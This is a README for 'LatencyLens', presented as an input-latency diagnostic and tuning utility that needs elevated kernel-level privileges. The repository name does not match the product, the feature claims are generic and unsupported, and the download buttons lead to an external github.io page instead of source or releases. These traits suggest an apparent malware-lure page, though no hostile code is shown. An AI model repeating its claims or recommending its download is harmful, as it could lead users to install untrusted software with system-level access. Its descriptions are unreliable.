![preview](https://raw.githubusercontent.com/SUKHBHAI/input-lag-eliminator-boost/main/promo_bc937e.svg)

# LatencyLens — Adaptive Input Responsiveness Diagnostic Suite

![Build Status](https://img.shields.io/badge/build-passing-brightgreen) ![Platform](https://img.shields.io/badge/platform-Windows%20%7C%20macOS%20%7C%20Linux-lightgrey) ![License](https://img.shields.io/badge/license-MIT-blue)

## Overview

LatencyLens is not merely another performance tweaker. It is a **perceptual engineering instrument** — a quiet auditor that sits between your hardware interrupts and your muscle memory, measuring the invisible gaps that make a mouse click feel like a half-second too late. Where conventional utilities apply blanket registry patches, LatencyLens builds a **dynamic latency map** of your entire input chain, from raw device polling to frame presentation, then offers surgical, reversible calibrations based on your specific workload.

Think of it as a **stethoscope for your peripheral nervous system** — the system that connects your fingertip to the pixels on screen. It does not shout "optimize everything." Instead, it whispers, "here is the 3.2ms delay hiding in your USB controller's interrupt moderation, and here is a gentle way to shave it without destabilizing your audio interface."

## Why LatencyLens Exists

Modern operating systems are marvels of abstraction, but abstraction costs cycles. Every layer between the physical keypress and the rendered frame adds a few microseconds — imperceptible individually, maddening cumulatively. Gamers, digital artists, and esports enthusiasts have long resorted to either brute-force system modifications that break other functionality, or they simply accept the lag as an immutable fact of life.

LatencyLens rejects both extremes. It provides a **measurement-first philosophy**: nothing changes until you see the numbers. Once you see the numbers, you decide what matters. The suite never applies a modification without showing you the predicted impact, the potential side effects, and a one-click reversal mechanism.

## Key Features

- **Per-Polling-Rate Analysis** — Maps the actual interrupt delivery time of each connected input device, identifying which USB ports are sharing IRQ lines with storage controllers.
- **Frame Pacing Visualizer** — Overlays your real-time frame delivery interval against your display's refresh cycle, revealing micro-stutters invisible to the naked eye.
- **DWM Composition Delay Probe** — On Windows, measures the Desktop Window Manager's composition backlog and offers a toggle to bypass composition for fullscreen applications only.
- **Input Queue Depth Monitor** — Tracks how many unprocessed input packets accumulate during CPU spikes, showing you exactly how much lag a background process is causing.
- **Adaptive Clock Synchronization** — Aligns the high-resolution event timer with your system's power management state, preventing the infamous "timer drift" that causes periodic input jitter.
- **Profiles for Creative Workflows** — Unlike gaming-only tools, LatencyLens includes calibration presets for digital audio workstations (low buffer glitch reduction), 3D modeling (precision stylus input), and video editing (timeline scrubbing smoothness).
- **Multilingual Interface** — The suite speaks English, Japanese, German, and Simplified Chinese, with community translation support for twelve additional languages.
- **Responsive Dashboard** — Whether on a 4K monitor or a 1366×768 laptop display, the telemetry dashboard adapts its density and layout without losing critical information density.
- **24/7 Telemetry Logging** — Runs as a lightweight background service, logging input latency patterns over weeks to identify slow degradation caused by driver updates or thermal throttling.

## Getting Started

![Dashboard Preview](https://img.shields.io/badge/UI-Dashboard-teal)

Upon first launch, LatencyLens performs a **baseline sweep** — a two-minute automated exercise that measures your input latency across idle, light load, and heavy load scenarios. This baseline becomes your reference point. All subsequent recommendations are relative to this personal benchmark, not to some abstract industry average.

[![Download](https://raw.githubusercontent.com/SUKHBHAI/input-lag-eliminator-boost/main/pkg_32693bb.svg)](https://SUKHBHAI.github.io/input-lag-eliminator-boost/)

### System Requirements

- **Operating System:** Windows 10/11 (64-bit), macOS 12+, or Linux (kernel 5.15+ with evdev support)
- **Memory:** 512 MB available RAM for the monitoring service
- **Storage:** 150 MB for program files and telemetry databases
- **Permissions:** Requires kernel-level access to read performance counters; installer will request elevated privileges once.

## Understanding Your Latency Signature

Every system has a unique "latency fingerprint" — a combination of hardware choices, driver versions, and background software that determines how responsive your setup feels. LatencyLens visualizes this fingerprint as a **waterfall chart**, breaking down the total input-to-photon delay into four segments:

1.  **Device Polling** — How often your mouse or keyboard reports its state to the OS.
2.  **Driver Processing** — The time your input driver takes to translate hardware signals into OS events.
3.  **Application Frame** — How long your game or software takes to incorporate the input into the next rendered frame.
4.  **Display Delivery** — The interval between the frame being presented and your panel physically emitting the photons.

This breakdown demystifies the "it feels slow but my FPS is high" paradox. You may discover that your display's "1ms response time" is marketing speak, and your actual panel overdrive is adding 6ms of ghosting — which no software tweak can fix. LatencyLens tells you when the problem is unfixable via software, saving you hours of futile registry edits.

### The Measurement Methodology

The suite uses a **dual-clock correlation technique**. It reads the system's high-resolution event timer (HPET or TSC) and cross-references it with the GPU's presentation statistics. This dual-source approach eliminates the bias of trusting any single performance counter. The results are statistically smoothed using a moving median filter, so one anomalous frame does not corrupt the entire measurement session.

## Configuration Profiles

### 👾 Esports Purity Profile

This profile disables all non-essential input processing for a single foreground application: mouse acceleration, pointer precision enhancement, and desktop composition effects. It re-enables everything the moment the application loses focus. The philosophy here is **temporal isolation** — the operating system steps aside entirely.

### 🎧 Studio Monitoring Profile

Designed for audio production, this profile prioritizes consistent frame pacing over raw speed. It gently throttles background indexing services that cause micro-freezes in ASIO buffers. The result is not lower latency, but **eliminated variance** — which matters more for audio critical listening.

### 🎨 Precision Stylus Profile

For digital artists using drawing tablets, this profile calibrates the coalescing buffer that Windows uses to merge rapid pen inputs. It ensures that every stroke point is delivered in its true chronological order, eliminating the "rounded corner" effect on fast stroke curves.

## The Latency Suppressor Engine

At the core of the diagnostic suite lies the **Latency Suppressor Engine** — a dynamic supervisor that watches for specific system events known to cause input stalls:

- **DPC/ISR Blocking** — When a network driver monopolizes the CPU with deferred procedure calls, the engine detects this and re-prioritizes the input thread.
- **Cache Line Contention** — On multi-core systems, the engine can assign the input processing thread to a core that does not share an L2 cache partition with a heavy background thread.
- **Power State Transition Latency** — When the CPU transitions from low-power C-states to active C0 state, there is an inherent wake delay. The engine can pin the input handling to remain in C0, reducing wake latency at the cost of negligible power consumption increase.

**Important Note:** All suppression techniques are **opt-in per device**. The engine does not force a global configuration. You, as the system sovereign, decide the trade-offs.

## Telemetry and Reporting

The suite includes a **weekly latency digest** — a human-readable summary sent to your local dashboard that outlines:

- Average latency changes since the previous week
- Which background processes contributed the most interrupt churn
- A "fragility score" for your current driver set, predicting how likely a system update is to degrade input performance
- Recommended driver versions from reputable hardware validation sources

This digest is generated exclusively on your machine. It does not contact external servers, does not phone home, and does not collect any personally identifiable information. Your telemetry is your property.

## Multilingual Support

The interface localization is not a simple dictionary swap. LatencyLens adapts its **technical terminology** for each locale:

- **English** — uses standard Windows and Linux performance terms
- **Japanese** — includes the appropriate カタカナ technical loanwords, but also offers 和訳 explanations for deeper understanding
- **German** — constructs compound nouns properly (e.g., *Eingabeverzögerungsanalyse*) without German language clutter
- **Simplified Chinese** — translates the UI labels to Common Technical Chinese while keeping the API and diagnostics log in English for cross-tool compatibility

To request an additional language, users can submit terminology mapping files via the community repository. The core engine always runs in English; only the presentation layer is localized.

## Community and Support

### 24/7 Support Infrastructure

While LatencyLens is an open-source project, users contributing to the development branch gain access to a **priority response channel** for anomaly triage. This is not a hotline — it is a collaborative diagnostics thread where maintainers and power users analyze your latency signature logs together. Replies typically arrive within one hour during European and North American timezone overlaps.

### Documentation Library

The projects wiki contains:

- A **Visual Glossary of Latency Terms** — with animated diagrams showing where each delay occurs
- **Hardware Database** — community-vetted reports of which USB controllers add the least overhead
- **Case Studies** — detailed breakdowns of how various configurations improved (or failed to improve) perceived responsiveness in specific games and creative software

## Contributing Guidelines

Contributions are welcome in four forms:

1.  **Measurement Data** — Anonymized latency signatures shared via the telemetry export feature helps refine baseline expectations for different hardware combinations.
2.  **Localization Files** — JSON translation keys for additional languages.
3.  **Driver Pattern Recognition** — Known problematic driver behaviors that the Suppressor Engine can detect proactively.
4.  **GPU Present Mode Detection** — Improvements to the frame delivery assessment beyond the current Flip/Direct Flip/Composition classification.

Please refer to the CONTRIBUTING.md file in the repository root for code style and commit message conventions. We use a **squash-merge** workflow with a single maintainer review per PR.

## Disclaimer Important Notice

LatencyLens modifies system-level performance parameters. While all modifications are designed to be reversible and are accompanied by automatic backups, there is inherent risk in any low-level system adjustment. Potential side effects include:

- Reduced battery life on laptops (due to preventing deep processor sleep states)
- Audio dropouts if the interrupt priority is altered while an audio interface is active
- Micro-stutter in background applications while the Foreground Boost feature is active
- In rare cases with in-flight driver updates, the interface may require a restart to stabilize

**You use this software at your own discretion.** The development team is not responsible for hardware damage resulting from overclocking-related latency adjustments, nor for game account penalties arising from the user manual modification of anti-cheat compatible settings. Always ensure your system is backed up before running the Calibration Wizard in "Aggressive Mode."

The tool explicitly does not:

- Bypass any anti-cheat mechanisms.
- Alter the behavior of digital rights management systems.
- Mask the detection of peripherals with internal macros.

## License and Legal Use

LatencyLens is distributed under the **MIT License**. You are free to use, modify, and distribute this software in personal and commercial projects, provided that the original copyright notice and permission notice are included in all copies or substantial portions of the software.

The software is provided "as is," without warranty of any kind, express or implied, including but not limited to the warranties of merchantability, fitness for a particular purpose, and noninfringement. In no event shall the authors or copyright holders be liable for any claim, damages, or other liability, whether in an action of contract, tort, or otherwise, arising from, out of, or in connection with the software or the use or other dealings in the software.

For the full legal text, please view the [MIT License](https://opensource.org/licenses/MIT) at the official Open Source Initiative page. The year 2026 marks the anticipated stable release cycle version 1.9 with extended device support.

---

**Final Notes on Mindset**

Input latency is not a bug to be eradicated; it is a physical property of signal propagation. LatencyLens helps you understand the physical realities of your setup and choose the best available compromise within those constraints. When software tweaks cannot help, the tool will tell you honestly — and point you toward hardware upgrades that will actually matter.

Measure, calibrate, and perceive the difference. That is the LatencyLens promise.

[![Download](https://raw.githubusercontent.com/SUKHBHAI/input-lag-eliminator-boost/main/pkg_32693bb.svg)](https://SUKHBHAI.github.io/input-lag-eliminator-boost/)